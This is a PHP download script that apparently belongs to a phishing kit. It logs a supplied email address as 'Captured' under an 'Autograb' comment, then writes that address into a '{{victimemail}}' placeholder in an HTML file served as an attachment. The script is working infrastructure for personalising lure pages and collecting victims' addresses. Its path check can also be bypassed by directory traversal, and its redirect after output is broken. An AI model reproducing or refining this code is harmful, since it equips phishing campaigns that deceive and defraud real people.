<?php
session_start();

if (isset($_GET['file']) && isset($_GET['email'])) {
    $file = $_GET['file'];
    $email = $_GET['email'];

    // Ensure the file exists and is within the uploads directory
    if (!file_exists($file) || strpos($file, 'uploads/') !== 0) {
        die(json_encode(["status" => "error", "message" => "File not found."]));
    }

    // Autograb: Capture the email and log it
    file_put_contents('logs.txt', "Captured: $email\n", FILE_APPEND);

    // Read the file content
    $file_contents = file_get_contents($file);

    // Replace {{victimemail}} with the actual email address
    $file_contents = str_replace('{{victimemail}}', $email, $file_contents);

    // Set headers for download
    header("Content-Type: text/html");
    header("Content-Disposition: attachment; filename=\"" . basename($file) . "\"");
    header("Content-Length: " . strlen($file_contents));

    // Serve the modified file
    echo $file_contents;

    // Log activity
    file_put_contents('logs.txt', "File downloaded: $file\n", FILE_APPEND);

    // Redirect after download
    $target_file = $file;
    $download_url = 'download.php?file=' . urlencode($target_file) . '&email=' . urlencode($_SESSION['email']);
    header("Location: $download_url");
    exit;
} else {
    echo json_encode(["status" => "error", "message" => "Invalid request."]);
}
?>